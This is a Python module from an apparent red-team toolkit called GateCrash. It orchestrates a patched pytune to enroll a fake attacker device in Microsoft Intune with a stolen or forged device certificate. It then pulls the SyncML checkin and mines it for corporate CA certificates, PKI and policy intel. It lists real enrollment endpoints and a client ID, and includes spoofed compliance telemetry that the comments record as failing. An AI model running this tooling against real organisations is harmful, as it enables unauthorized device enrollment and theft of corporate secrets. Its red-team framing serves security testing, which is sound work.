"""Module 8: Intune / MDM operations.

Orchestrates the patched pytune for MDM enrollment + SyncML checkin
(secureworks/pytune v1.2, patched), then parses the checkin capture for corporate
intel via post_ex.syncml_intel.

Steps:
  8  enroll_intune (device cert + --device_token --hybrid) -> Microsoft Intune MDM Device CA cert
  9  checkin (MDM cert mTLS) -> SyncML/OMA-DM, pulls corp CA certs / PKI / policies (no MFA)
 10  compliance telemetry spoof -> ACCEPTED (HTTP 200) but does NOT flip compliance
     (server-side HAS/TPM validation; defense-in-depth held -- confirmed dead-end, see DEAD_ENDS.md)

Known endpoints from the engagement (tenant-agnostic shapes; discovery returns the live ones):
  enroll:   https://fef.<sub>.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
  checkin:  https://r.manage.microsoft.com/devicegatewayproxy/cimhandler.ashx
  prtauth client for enrollment token: 29d9ed98-a469-4536-ade2-f981bc1d605e
            resource enrollment.manage.microsoft.com, redirect ms-aadj-redir://auth/mdm
"""
import os
import shutil
import subprocess

# Step 10: fabricated health telemetry (patched into pytune device/windows.py). Documented as a
# dead-end: Intune evaluates compliance server-side (HAS needs a real TPM-signed attestation).
COMPLIANCE_TELEMETRY_SPOOF = {
    "DeviceStatus/Compliance/EncryptionCompliance": 1,  # BitLocker "enabled"
    "DeviceStatus/Antivirus/Status": 0,                 # no threats
    "DeviceStatus/Firewall/Status": 1,                  # firewall "enabled"
    "WindowsAdvancedThreatProtection": "spoofed",       # Defender ATP
}


def run(cfg, eng, args):
    pytune = shutil.which("pytune")
    if not pytune:
        _no_pytune()
        return {"pytune": False}
    if not (cfg.device_cert_path or os.path.exists(os.path.join(eng.certs, "device_cert.pem"))):
        print("[intune] Need a device cert (run device-reg first).")
        return {"pytune": True, "error": "no_device_cert"}

    device = getattr(args, "device_name", None) or "DESKTOP-ATK01"
    pfx = cfg.device_cert_path or os.path.join(eng.certs, "atk01-pytune.pfx")
    out_dir = os.path.join(eng.evidence, "intune")
    os.makedirs(out_dir, exist_ok=True)

    print(f"[intune] Step 8: enroll_intune ({device}) via pytune...")
    enroll = subprocess.run(
        ["pytune", "-v", "enroll_intune", "-c", pfx, "-d", device, "-o", "Windows",
         "--device_token", "--hybrid"],
        cwd=out_dir, capture_output=True, text=True)
    print(enroll.stdout[-800:] if enroll.stdout else "")
    if enroll.returncode != 0:
        print(f"[intune] enroll failed:\n{enroll.stderr[-600:]}")
        return {"pytune": True, "error": "enroll_failed"}

    mdm_pfx = os.path.join(out_dir, f"{device}_mdm.pfx")
    print(f"[intune] Step 9: SyncML checkin...")
    checkin = subprocess.run(
        ["pytune", "-v", "checkin", "-m", mdm_pfx, "-d", device, "-o", "Windows"],
        cwd=out_dir, capture_output=True, text=True)
    capture = os.path.join(out_dir, "checkin_capture.txt")
    with open(capture, "w", encoding="utf-8") as f:
        f.write(checkin.stdout or "")
    print(f"[intune] checkin exit={checkin.returncode}, capture -> {capture}")

    # Step 9 cont.: mine the capture for corporate intel.
    from modules.post_ex import syncml_intel
    intel = syncml_intel(checkin.stdout or "", eng)
    eng.save_json("evidence", "syncml_intel", intel)
    print(f"[intune] Extracted intel: {list(intel.keys())}")

    print("[intune] Step 10: compliance telemetry spoof is ACCEPTED (200) but does NOT propagate "
          "(server-side TPM/HAS validation). Not a bypass -- see DEAD_ENDS.md.")
    result = {"pytune": True, "mdm_pfx": mdm_pfx, "capture": capture, "intel": intel}
    eng.save_json("evidence", "intune_enroll", result)
    return result


def _no_pytune():
    print("[intune] pytune not found on PATH. This module orchestrates the patched pytune.")
    print("[intune] Patched pytune ships with GateCrash in vendor/pytune_patches/")
    print("[intune] Setup: pip install pytune, then copy the patched files over the originals.")
    print("[intune] See vendor/pytune_patches/README.md for env vars and usage.")
    print("[intune] Linux/Kali/WSL only. Deliverables: MDM cert + SyncML intel.")
